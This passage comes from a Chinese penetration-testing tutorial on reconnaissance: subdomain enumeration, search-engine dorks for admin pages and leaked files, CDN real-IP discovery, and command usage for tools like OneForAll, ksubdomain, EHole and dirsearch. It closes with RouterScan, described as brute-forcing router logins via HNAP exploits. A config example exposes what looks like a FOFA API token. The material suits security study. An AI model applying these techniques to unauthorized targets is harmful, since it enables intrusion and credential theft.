</li>
<li><p>ZoomEye：<a href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p>
</li>
</ul>
<p><strong>收集子域名方法九：利用网站js文件提取二级域名</strong></p>
<p>工具：</p>
<p>​	<a href="https://github.com/Threezh1/JSFinder">jfFinder</a></p>
<h5 id="C端、旁站收集"><a href="#C端、旁站收集" class="headerlink" title="C端、旁站收集"></a>C端、旁站收集</h5><p>​	获取其他域名信息&#x2F;获取其他局域网主机地址信息</p>
<p>在线网站：</p>
<p>​	<a href="https://tool.chinaz.com/same">网站IP查询_IP反查域名_同IP网站查询 - 站长工具</a></p>
<p>​	<a href="https://site.ip138.com/">域名查iP 域名解析 iP查询网站 iP反查域名 iP反查网站 同一iP网站 同iP网站域名iP查询</a></p>
<p>​	</p>
<p>工具：</p>
<p>​	<a href="https://gobies.org/">Goby— 资产绘测及实战化漏洞扫描工具</a></p>
<p>​	<a href="https://github.com/foryujian/yujianportscan">御剑</a></p>
<p>​	<a href="https://nmap.org/">Nmap: the Network Mapper - Free Security Scanner</a></p>
<p>​	K8、IISPutScanner	(前提条件要获取到网站的真实ip)</p>
<h5 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h5><p>​	<a href="https://x.threatbook.com/">微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区</a></p>
<p>​	<a href="https://ti.360.cn/">360安全大脑</a></p>
<p>​	<a href="https://ti.qianxin.com/">奇安信威胁情报中心</a></p>
<h4 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h4><h5 id="Web源代码泄露"><a href="#Web源代码泄露" class="headerlink" title="Web源代码泄露"></a><strong>Web源代码泄露</strong></h5><p>​	1）收集源代码备份信息</p>
<p>​		利用7kbscan工具</p>
<p>​	2）收集特定站点目录中的扩展文件</p>
<p>​		.git 目录信息泄露，也可以通过（GitHack）.git目录获取源代码</p>
<p>​		.DS_store 仿照7kbscan字典形式创建&#x2F;【目录名】&#x2F;.DS_store字典并进行扫描</p>
<p>​			通过 ds_store_exp.py 【.DS_store路径】递归下载到本地</p>
<p>​		.svn 仿照7kbscan字典形式创建.svp字典并进行扫描</p>
<p>​			通过seay svn添加网站实现源码下载</p>
<p>​		.hg等……</p>
<p>​	3）社工信息泄露</p>
<p>​		泄露敏感信息注册到一些网站（手机号 身份号 QQ 微信）</p>
<h5 id="GooleHack"><a href="#GooleHack" class="headerlink" title="GooleHack"></a>GooleHack</h5><p><a href="https://cn.bing.com/">https://cn.bing.com/</a></p>
<p>1.后台地址</p>
<ul>
<li>site:xxx.com 管理后台&#x2F;登录&#x2F;管理员&#x2F;系统，可以通过添加双引号增加精确度</li>
<li>site:xxx.com inurl:login&#x2F;admin&#x2F;system&#x2F;guanli&#x2F;demglu</li>
</ul>
<p>2.敏感文件</p>
<ul>
<li>site:xxx.com filetype:pdf&#x2F;doc&#x2F;xls&#x2F;txt</li>
<li>site:xxx.com filetype:log&#x2F;sql.conf</li>
</ul>
<p>3.测试环境</p>
<ul>
<li>site: xxx.com inurl:test&#x2F;ceshi</li>
<li>site: xxx.com intitle:测试&#x2F;后台</li>
</ul>
<p>4.邮箱&#x2F;QQ&#x2F;群</p>
<ul>
<li>site: xxx.com 邮件&#x2F;email</li>
<li>site: xxx.com qq&#x2F;群&#x2F;企鹅&#x2F;腾讯</li>
<li>site: xxx.com intitle:”Outlook Web App”  邮件服务器web界面</li>
<li>site: xxx.com intitle:”mail”</li>
<li>site: xxx.com intitle:”webmail”</li>
</ul>
<p>5.其他</p>
<ul>
<li>site:xxx.com inurl:api</li>
<li>site:xxx.com inurl:uid&#x3D;&#x2F;id&#x3D;</li>
<li>site:xxx.com intitle:index of “server at”</li>
</ul>
<h5 id="历史漏洞信息收集"><a href="#历史漏洞信息收集" class="headerlink" title="历史漏洞信息收集"></a>历史漏洞信息收集</h5><p>在线网站：</p>
<p>​	补天地址：<a href="https://www.butian.net/">https://www.butian.net/</a></p>
<p>​	漏洞银行：<a href="https://m.bugbank.cn/">https://m.bugbank.cn/</a></p>
<p>​	乌云网址：<a href="https://wy.zone.ci/index.php">https://wy.zone.ci/index.php</a></p>
<p>​	CNVD:  <a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></p>
<p>​	CNNVD：<a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn</a></p>
<p>​	Seebug：<a href="https://www.seebug.org/">https://www.seebug.org</a></p>
<p>​	Exploit Database：<a href="https://www.exploit-db.com/">https://www.exploit-db.com</a></p>
<p>​	Sploitus：<a href="https://sploitus.com/">https://sploitus.com</a></p>
<h5 id="网盘引擎"><a href="#网盘引擎" class="headerlink" title="网盘引擎"></a>网盘引擎</h5><ul>
<li>盘搜搜：<a href="http://www.pansoso.org/">http://www.pansoso.org</a></li>
<li>盘多多：<a href="http://www.panduoduo.net/">http://www.panduoduo.net</a></li>
<li>大力盘：<a href="https://dalipan.com/">https://dalipan.com</a></li>
</ul>
<h5 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h5><p>​	指纹识别就是识别搭建网站的方式（dedecms、wordpress、edusoho、wencenter 、jira）</p>
<blockquote>
<p>cms平台        ：完整内容管理平台（适合搭建官方网站）</p>
<p>dz   平台	：论坛</p>
<p>edusoho       ：线上视频网站</p>
<p>wecenter      ：线上社交平台</p>
<p>JIRA		:  项目管理平台</p>
<p>confluence   ：企业内部网盘	</p>
<p>wordpress    ：博客系统</p>
</blockquote>
<p>在线网站：</p>
<ul>
<li>火狐插件：Wappalyzer</li>
<li>云悉：<a href="http://www.yunsee.cn/">http://www.yunsee.cn</a></li>
<li>whatweb：<a href="https://www.whatweb.net/">https://www.whatweb.net</a></li>
<li>在线：<a href="http://whatweb.bugscaner.com/look">http://whatweb.bugscaner.com/look</a></li>
<li>Nucle：<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></li>
<li>潮汐：<a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></li>
</ul>
<p>使用御剑增强版也可以识别网站指纹信息</p>
<h5 id="网站安全程序识别方法"><a href="#网站安全程序识别方法" class="headerlink" title="网站安全程序识别方法"></a>网站安全程序识别方法</h5><p>kali自动集成</p>
<p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
<p>进行程序安装：python setup.py install</p>
<p>软件程序测试： 进入wafw00f目录执行main.py <a href="http://www.safedog.cn/">www.safedog.cn</a></p>
<h5 id="CDN识别"><a href="#CDN识别" class="headerlink" title="CDN识别"></a>CDN识别</h5><ul>
<li>通过Ping一个不存在的二级域名获取真实ip或没有挂cdn的域名（主要是通过泛域名解析）</li>
<li>利用fofa语法title标签获取真实ip</li>
<li>DNS历史记录<ul>
<li><a href="https://sitereport.net.craft.com/?url=https://www.oldboyedu.com">https://sitereport.net.craft.com/?url=https://www.oldboyedu.com</a></li>
</ul>
</li>
<li>是否存在phpinfo.php（在phpinfo中的SERVER_ADDR或者SERVER[“”SERVER_ADDR]）找到真实IP</li>
<li>通过国外VPS Ping</li>
</ul>
<p>在线工具</p>
<p><strong>真实ip</strong></p>
<ul>
<li>全球ping：<a href="https://www.wepcc.com/">https://www.wepcc.com</a></li>
<li>dns检测：<a href="https://tools.ipip.net/dns.php">https://tools.ipip.net/dns.php</a></li>
<li>Xcdn：<a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a></li>
<li>在线：<a href="https://ipchaxun.com/">https://ipchaxun.com</a></li>
</ul>
<h2 id="工具参考"><a href="#工具参考" class="headerlink" title="工具参考"></a>工具参考</h2><h3 id="Dnsenum（DNS域传输漏洞）"><a href="#Dnsenum（DNS域传输漏洞）" class="headerlink" title="Dnsenum（DNS域传输漏洞）"></a>Dnsenum（DNS域传输漏洞）</h3><p>工具介绍：DNS域传送漏洞（KALI）收集一个域的信息，通过谷歌或者字典文件猜测可能存在的域名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用法</span></span><br><span class="line">dnsenum 【选项】 &lt;域&gt;</span><br><span class="line"></span><br><span class="line">常用选项：</span><br><span class="line">	--dnsserver &lt;server&gt;	选择解析的DNS服务器</span><br><span class="line">	-v 						显示详细信息</span><br><span class="line">	-f						从此文件中读取子域进行暴力破解</span><br><span class="line">	--noreverse				跳过反向查找操作</span><br></pre></td></tr></table></figure>

<h3 id="oneForAll-子域名收集器"><a href="#oneForAll-子域名收集器" class="headerlink" title="oneForAll 子域名收集器"></a>oneForAll 子域名收集器</h3><p>项目地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
<p>oneforall 依赖安装</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd OneForAll/</span><br><span class="line">python3 -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">python3 oneforall.py --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>



<p>oneforall使用方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行示例</span></span><br><span class="line">python3 oneforall.py --target example.com.cn run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用字典进行搜集</span></span><br><span class="line">python3 oneforall.py --targets ./example.txt run</span><br></pre></td></tr></table></figure>

<p>运行结束后会在相应文件夹产生结果文件</p>
<p><img src="/img/oldboy/1-5.png"></p>
<blockquote>
<p>需要python 3.6.0以上环境才能运行</p>
<p>使用 python 3.11 及以上版本时oneforall会出现一个 cannot import name ‘sre_parse’ from ‘re’ 的报错：</p>
<p>修复方法</p>
<p>​	pip uninstall exrex </p>
<p>​	pip install exrex</p>
</blockquote>
<h3 id="ksubdomain-无状态子域名爆破工具"><a href="#ksubdomain-无状态子域名爆破工具" class="headerlink" title="ksubdomain 无状态子域名爆破工具"></a>ksubdomain 无状态子域名爆破工具</h3><p>工具特点：ksubdomain的发送和接收是分离不依赖系统的，所以速度快</p>
<p>项目地址：<a href="https://github.com/knownsec/ksubdomain">knownsec&#x2F;ksubdomain: 无状态子域名爆破工具</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">常用命令：</span></span><br><span class="line">使用内置字典爆破</span><br><span class="line">ksubdomain -d seebug.org</span><br><span class="line"></span><br><span class="line">使用字典爆破域名</span><br><span class="line">ksubdomain -d seebug.org -f subdomains.dict</span><br><span class="line"></span><br><span class="line">字典里都是域名，可使用验证模式</span><br><span class="line">ksubdomain -f dns.txt -verify</span><br><span class="line"></span><br><span class="line">爆破三级域名</span><br><span class="line">ksubdomain -d seebug.org -l 2</span><br><span class="line"></span><br><span class="line">通过管道爆破</span><br><span class="line">echo &quot;seebug.org&quot;|ksubdomain</span><br><span class="line"></span><br><span class="line">通过管道验证域名</span><br><span class="line">echo &quot;paper.seebug.org&quot;|ksubdomain -verify</span><br><span class="line"></span><br><span class="line">仅使用网络API接口获取域名</span><br><span class="line">ksubdomain -d seebug.org -api</span><br><span class="line"></span><br><span class="line">完整模式,先使用网络API，在此基础使用内置字典进行爆破</span><br><span class="line">ksubdomain -d seebug.org -full</span><br><span class="line"></span><br><span class="line">Summary整理功能</span><br><span class="line">ksubdomain -d seebug.org -summary</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">相关参数</span></span><br><span class="line">  -api</span><br><span class="line">        使用网络接口</span><br><span class="line">  -b string</span><br><span class="line">        宽带的下行速度，可以5M,5K,5G (default &quot;1M&quot;)</span><br><span class="line">  -check-origin</span><br><span class="line">        会从返回包检查DNS是否为设定的，防止其他包的干扰</span><br><span class="line">  -csv</span><br><span class="line">        输出excel文件</span><br><span class="line">  -d string</span><br><span class="line">        爆破域名</span><br><span class="line">  -dl string</span><br><span class="line">        从文件中读取爆破域名</span><br><span class="line">  -e int</span><br><span class="line">        默认网络设备ID,默认-1，如果有多个网络设备会在命令行中选择 (default -1)</span><br><span class="line">  -f string</span><br><span class="line">        字典路径,-d下文件为子域名字典，-verify下文件为需要验证的域名</span><br><span class="line">  -filter-wild</span><br><span class="line">        自动分析并过滤泛解析，最终输出文件，需要与&#x27;-o&#x27;搭配</span><br><span class="line">  -full</span><br><span class="line">        完整模式，使用网络接口和内置字典</span><br><span class="line">  -l int</span><br><span class="line">        爆破域名层级,默认爆破一级域名 (default 1)</span><br><span class="line">  -list-network</span><br><span class="line">        列出所有网络设备</span><br><span class="line">  -o string</span><br><span class="line">        输出文件路径</span><br><span class="line">  -s string</span><br><span class="line">        resolvers文件路径,默认使用内置DNS</span><br><span class="line">  -sf string</span><br><span class="line">        三级域名爆破字典文件(默认内置)</span><br><span class="line">  -silent</span><br><span class="line">        使用后屏幕将仅输出域名</span><br><span class="line">  -skip-wild</span><br><span class="line">        跳过泛解析的域名</span><br><span class="line">  -summary</span><br><span class="line">        在扫描完毕后整理域名归属asn以及IP段</span><br><span class="line">  -test</span><br><span class="line">        测试本地最大发包数</span><br><span class="line">  -ttl</span><br><span class="line">        导出格式中包含TTL选项</span><br><span class="line">  -verify</span><br><span class="line">        验证模式</span><br></pre></td></tr></table></figure>



<h3 id="subDomainsBrute-暴力域名枚举工具"><a href="#subDomainsBrute-暴力域名枚举工具" class="headerlink" title="subDomainsBrute 暴力域名枚举工具"></a>subDomainsBrute 暴力域名枚举工具</h3><p>工具特点：高并发的DNS暴力枚举工具，支持Python3.6+和Python2.7，建议使用Python3.8+。</p>
<p>项目地址：<a href="https://github.com/lijiejie/subDomainsBrute">lijiejie&#x2F;subDomainsBrute: A fast sub domain brute tool for pentesters</a></p>
<p>使用方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage: subDomainsBrute.py [options] target.com</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program&#x27;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -f FILE               File contains new line delimited subs, default is</span><br><span class="line">                        subnames.txt.</span><br><span class="line">  --full                Full scan, NAMES FILE subnames_full.txt will be used</span><br><span class="line">                        to brute</span><br><span class="line">  -i, --ignore-intranet</span><br><span class="line">                        Ignore domains pointed to private IPs</span><br><span class="line">  -w, --wildcard        Force scan after wildcard test failed</span><br><span class="line">  -t THREADS, --threads=THREADS</span><br><span class="line">                        Num of scan threads, 500 by default</span><br><span class="line">  -p PROCESS, --process=PROCESS</span><br><span class="line">                        Num of scan process, 6 by default</span><br><span class="line">  --no-https            Disable get domain names from HTTPS cert, this can</span><br><span class="line">                        save some time</span><br><span class="line">  -o OUTPUT, --output=OUTPUT</span><br><span class="line">                        Output file name. default is &#123;target&#125;.txt</span><br></pre></td></tr></table></figure>

<h3 id="Sublist3r-子域名枚举工具"><a href="#Sublist3r-子域名枚举工具" class="headerlink" title="Sublist3r 子域名枚举工具"></a>Sublist3r 子域名枚举工具</h3><p>工具特点：Sublist3r 是一个 python 工具，旨在使用 OSINT 枚举网站的子域。它可以帮助渗透测试人员和错误猎人收集和收集他们所针对的域的子域。Sublist3r 使用许多搜索引擎（如 Google、Yahoo、Bing、Baidu 和 Ask）列举子域。Sublist3r 还使用 Netcraft、Virustotal、ThreatCrowd、DNSdumpster 和 ReverseDNS 枚举子域。</p>
<p>项目地址：<a href="https://github.com/aboul3la/Sublist3r">aboul3la&#x2F;Sublist3r：用于渗透测试人员的快速子域枚举工具</a></p>
<p>使用方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">获取基本选项帮助</span><br><span class="line">python sublist3r.py -h</span><br><span class="line"></span><br><span class="line">要枚举特定域的子域</span><br><span class="line">python sublist3r.py -d example.com</span><br><span class="line"></span><br><span class="line">要枚举特定域的子域并仅显示具有开放端口 80 和 443 的子域 </span><br><span class="line">python sublist3r.py -d example.com -p 80,443</span><br><span class="line"></span><br><span class="line">要枚举子域并启用 bruteforce 模块</span><br><span class="line">python sublist3r.py -b -d example.com</span><br></pre></td></tr></table></figure>

<p>相关参数</p>
<p><img src="/img/oldboy/1-6.png"></p>
<h3 id="Layer-子域名挖掘机"><a href="#Layer-子域名挖掘机" class="headerlink" title="Layer 子域名挖掘机"></a>Layer 子域名挖掘机</h3><p>项目地址：<a href="https://github.com/euphrat1ca/LayerDomainFinder">euphrat1ca&#x2F;LayerDomainFinder: Layer子域名挖掘机</a></p>
<p><img src="/img/oldboy/1-7.png"></p>
<p>输入对应的域名直接开始扫描即可</p>
<h3 id="jsFinder-扫描js文件提取二级域名"><a href="#jsFinder-扫描js文件提取二级域名" class="headerlink" title="jsFinder 扫描js文件提取二级域名"></a>jsFinder 扫描js文件提取二级域名</h3><p>JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。</p>
<p>项目代码：<a href="https://github.com/Threezh1/JSFinder">Threezh1&#x2F;JSFinder: JSFinder is a tool for quickly extracting URLs and subdomains from JS files on a website.</a></p>
<p>使用方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">简单爬取（爬取这单个页面的所有js连接，并在其中发现url和子域名）</span></span><br><span class="line">python JSFinder.py -u http://www.mi.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">深度爬取（使用-ou和-os 指定保存的URL和子域名的文件名）</span></span><br><span class="line">python JSFinder.py -u http://www.mi.com -d -ou mi_url.txt -os mi_subdomain.txt</span><br></pre></td></tr></table></figure>



<h3 id="subfinder-子域发现工具"><a href="#subfinder-子域发现工具" class="headerlink" title="subfinder 子域发现工具"></a>subfinder 子域发现工具</h3><p><code>subfinder</code>是一种子域发现工具，它使用被动在线资源返回网站的有效子域。它具有简单的模块化架构，并针对速度进行了优化。 专为 只做一件事 - 被动子域枚举，它做得很好</p>
<p>项目地址：<a href="https://github.com/projectdiscovery/subfinder?tab=readme-ov-file#running-subfinder">projectdiscovery&#x2F;subfinder: Fast passive subdomain enumeration tool.</a></p>
<p>使用方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  ./subfinder [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">INPUT:</span><br><span class="line">  -d, -domain string[]  domains to find subdomains for</span><br><span class="line">  -dL, -list string     file containing list of domains for subdomain discovery</span><br><span class="line"></span><br><span class="line">SOURCE:</span><br><span class="line">  -s, -sources string[]           specific sources to use for discovery (-s crtsh,github). Use -ls to display all available sources.</span><br><span class="line">  -recursive                      use only sources that can handle subdomains recursively (e.g. subdomain.domain.tld vs domain.tld)</span><br><span class="line">  -all                            use all sources for enumeration (slow)</span><br><span class="line">  -es, -exclude-sources string[]  sources to exclude from enumeration (-es alienvault,zoomeyeapi)</span><br><span class="line"></span><br><span class="line">FILTER:</span><br><span class="line">  -m, -match string[]   subdomain or list of subdomain to match (file or comma separated)</span><br><span class="line">  -f, -filter string[]   subdomain or list of subdomain to filter (file or comma separated)</span><br><span class="line"></span><br><span class="line">RATE-LIMIT:</span><br><span class="line">  -rl, -rate-limit int  maximum number of http requests to send per second</span><br><span class="line">  -rls value            maximum number of http requests to send per second for providers in key=value format (-rls &quot;hackertarget=10/s,shodan=15/s&quot;)</span><br><span class="line">  -t int                number of concurrent goroutines for resolving (-active only) (default 10)</span><br><span class="line"></span><br><span class="line">UPDATE:</span><br><span class="line">  -up, -update                 update subfinder to latest version</span><br><span class="line">  -duc, -disable-update-check  disable automatic subfinder update check</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">  -o, -output string       file to write output to</span><br><span class="line">  -oJ, -json               write output in JSONL(ines) format</span><br><span class="line">  -oD, -output-dir string  directory to write output (-dL only)</span><br><span class="line">  -cs, -collect-sources    include all sources in the output (-json only)</span><br><span class="line">  -oI, -ip                 include host IP in output (-active only)</span><br><span class="line"></span><br><span class="line">CONFIGURATION:</span><br><span class="line">  -config string                flag config file (default &quot;$CONFIG/subfinder/config.yaml&quot;)</span><br><span class="line">  -pc, -provider-config string  provider config file (default &quot;$CONFIG/subfinder/provider-config.yaml&quot;)</span><br><span class="line">  -r string[]                   comma separated list of resolvers to use</span><br><span class="line">  -rL, -rlist string            file containing list of resolvers to use</span><br><span class="line">  -nW, -active                  display active subdomains only</span><br><span class="line">  -proxy string                 http proxy to use with subfinder</span><br><span class="line">  -ei, -exclude-ip              exclude IPs from the list of domains</span><br><span class="line"></span><br><span class="line">DEBUG:</span><br><span class="line">  -silent             show only subdomains in output</span><br><span class="line">  -version            show version of subfinder</span><br><span class="line">  -v                  show verbose output</span><br><span class="line">  -nc, -no-color      disable color in output</span><br><span class="line">  -ls, -list-sources  list all available sources</span><br><span class="line"></span><br><span class="line">OPTIMIZATION:</span><br><span class="line">  -timeout int   seconds to wait before timing out (default 30)</span><br><span class="line">  -max-time int  minutes to wait for enumeration results (default 10)</span><br></pre></td></tr></table></figure>







<h3 id="EHole棱洞系统指纹探测工具"><a href="#EHole棱洞系统指纹探测工具" class="headerlink" title="EHole棱洞系统指纹探测工具"></a>EHole棱洞系统指纹探测工具</h3><p>EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic…)。EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。</p>
<p>项目地址：<a href="https://github.com/EdgeSecurityTeam/EHole">EdgeSecurityTeam&#x2F;EHole: EHole(棱洞)3.0 重构版-红队重点攻击系统指纹探测工具</a></p>
<p>参数信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\tools\collection\EHole_windows_amd64&gt;EHole_windows_amd64.exe finger -h</span><br><span class="line">从fofa或者本地文件获取资产进行指纹识别，支持单条url识别。</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  ehole finger [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -f, --fip string      从fofa提取资产，进行指纹识别，仅仅支持ip或者ip段，例如：192.168.1.1 | 192.168.1.0/24</span><br><span class="line">  -s, --fofa string     从fofa提取资产，进行指纹识别，支持fofa所有语法</span><br><span class="line">  -h, --help            help for finger</span><br><span class="line">  -l, --local string    从本地文件读取资产，进行指纹识别，支持无协议，列如：192.168.1.1:9090 | http://192.168.1.1:9090</span><br><span class="line">  -o, --output string   输出所有结果，当前仅支持json和xlsx后缀的文件。</span><br><span class="line">  -p, --proxy string    指定访问目标时的代理，支持http代理和socks5，例如：http://127.0.0.1:8080、socks5://127.0.0.1:8080</span><br><span class="line">  -t, --thread int      指纹识别线程大小。 (default 100)</span><br><span class="line">  -u, --url string      识别单个目标。</span><br><span class="line"></span><br><span class="line">Global Flags:</span><br><span class="line">      --config string   config file (default is $HOME/.ehole.yaml)</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##############################################################################################</span></span></span><br><span class="line"></span><br><span class="line">E:\tools\collection\EHole_windows_amd64&gt;EHole_windows_amd64.exe fofaext -h</span><br><span class="line">从fofa api提取资产并保存成xlsx，支持大批量ip提取,支持fofa所有语法。</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  ehole fofaext [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -s, --fofa string     从fofa提取资产，支持fofa所有语法，默认保存所有结果。</span><br><span class="line">  -h, --help            help for fofaext</span><br><span class="line">  -l, --ipfile string   从文本获取IP，在fofa搜索，支持大量ip，默认保存所有结果。</span><br><span class="line">  -o, --output string   指定输出文件名和位置，当前仅支持xlsx后缀的文件。 (default &quot;results.xlsx&quot;)</span><br><span class="line"></span><br><span class="line">Global Flags:</span><br><span class="line">      --config string   config file (default is $HOME/.ehole.yaml)</span><br></pre></td></tr></table></figure>

<p>使用方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本地识别</span></span><br><span class="line">EHole_windows_amd64.exe finger  -l url.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">url.txt文件格式：</span></span><br><span class="line">	http://192.168.100.1:10086/</span><br><span class="line">	https://192.168.100.1:10086/</span><br><span class="line"><span class="meta prompt_">	</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">fofa识别（需要配置FOFA密钥以及邮箱信息，在config.ini内配置好密钥以及邮箱即可使用）</span></span><br><span class="line">Email=om2bg0rl5cgyxdxtj2nhybfedmgo@open_wechat</span><br><span class="line">Fofa_token=7e067ef287ebdb200d523d181cd724bd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">支持单ip或IP段</span></span><br><span class="line">EHole_windows_amd64.exe finger -f 192.168.1.1</span><br><span class="line">EHole_windows_amd64.exe finger -f 192.168.1.0/24</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将结果输出到指定文件</span></span><br><span class="line">EHole_windows_amd64.exe -l url.txt -json export.json</span><br></pre></td></tr></table></figure>











<h3 id="dirsearch-Web路径发现"><a href="#dirsearch-Web路径发现" class="headerlink" title="dirsearch Web路径发现"></a>dirsearch Web路径发现</h3><p><img src="/img/oldboy/1-8.png"></p>
<p><a href="https://so.csdn.net/so/search?q=dirsearch&spm=1001.2101.3001.7020">dirsearch</a>是一个基于python的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件。</p>
<p>项目地址：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt        //安装依赖</span><br></pre></td></tr></table></figure>



<p>使用方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,html,js -u https://target</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist</span><br></pre></td></tr></table></figure>

<p>参数信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-u URL 						指定URL目标</span><br><span class="line">-L URLLIST 					指定URL列表目标</span><br><span class="line">-e	EXTENSIONS				指定扩展列表</span><br><span class="line">-R RECURSIVE_LEVEL_MAX	 	最大递归级别（子目录）（默认值：1[仅限根目录+1目录]）</span><br><span class="line">-r							递归暴力</span><br><span class="line">-t	THREADSCOUNT			指定线程数</span><br><span class="line">-w	WORDLIST				指定自定义单词表</span><br></pre></td></tr></table></figure>

<blockquote>
<p>HTTP 405 “Method Not Allowed” 是一个客户端错误响应状态码，表示请求中指定的方法（如GET、POST、PUT等）对于目标资源来说是不允许的。</p>
</blockquote>
<h3 id="Router-Scan路由器扫描"><a href="#Router-Scan路由器扫描" class="headerlink" title="Router Scan路由器扫描"></a>Router Scan路由器扫描</h3><p>RouterScan v2.51是我用过的路由器扫描软件中最容易使用，效果最好的，功能最全面的一个工具，成功率可以达到90%，非常适合新手和脚本小子使用。最为一款路由器安全测试工具，其最核心的功能当然还是在路由器扫描。</p>
<p><img src="/img/oldboy/image-20250306220911147.png" alt="image-20250306220911147"></p>
<p>扫描模块功能：</p>
<p>   Router Scan(main)模块是新版本中默认选择运行的模块，要想做快速检测时，可以单独选择此功能模块就行，但是它的缺点就是，成功获取认证帐号和密码的概率会降低，因为很多路由器单靠暴力破解是行不通的。</p>
<p>   Detect proxy servers，从字面上意思是检测代理服务器，但是它的具体作用，我暂时还没弄清楚，还请高手出来指点一二。我想应该是扫描检测可以作为代理的主机，以方便架设属于自己的VPN吧。</p>
<p>   Use HNAP 1.0，使用HNAP协议里的漏洞对路由器进行安全检测。HANP是</p>
<p>Home Network Administration Protocol的缩写，即家庭网络管理协议。是一种基于 HTTP-SOAP 实现的网络管理协议，具有其它大多数网络管理协议的相同特征:远程认证登陆、远程配置、信息获取，配置执行生效等。这个协议允许设备厂商通过该协议对自己设备进行远程管理和配置，以方便更好得管理自己的设备，给消费者用户提供更好的技术支持。但是某些路由器厂商也因这个协议而爆出漏洞：HNAP命令远程权限提升漏洞。 这个扫描工具正是集合了该漏洞的POC，成功得提升了路由器爆破的成功率，选择该模块之后，一些字典里没有的密码也可以被直接捕获到！</p>
<p>   SQLite Manager RCE，利用SQLite Manager 远程连接设备中的数据库，进行配置信息的检索，以达到爆破的目的。</p>
<p>   Hudson Java Servlet. 此功能还没测试过，因此具体作用未知。一般用上面这几个功能，它的爆破成功率已经高达80%，比市面上的很多扫描器要好很多，可称之为神器！</p>
<h4 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h4><p>1、路由器安全测试</p>
<p>1、设置软件参数，最大线程数使用默认的300就可以了，太高了会影响扫描成功率，建议在100-300之间，当然这也跟你的个人电脑的配置还有带宽等因素有关，如果配置带宽都很高，可以适当调高；设置超时时间，使用默认的2000就可以了；扫描端口：80、8080、1080；Scanning modules : Router Scan(main)，Use HNAP 1.0 ，就勾选这两个就足够了。最后再设置一个你想要测试的地址段，设置参数就完成了。如图：</p>
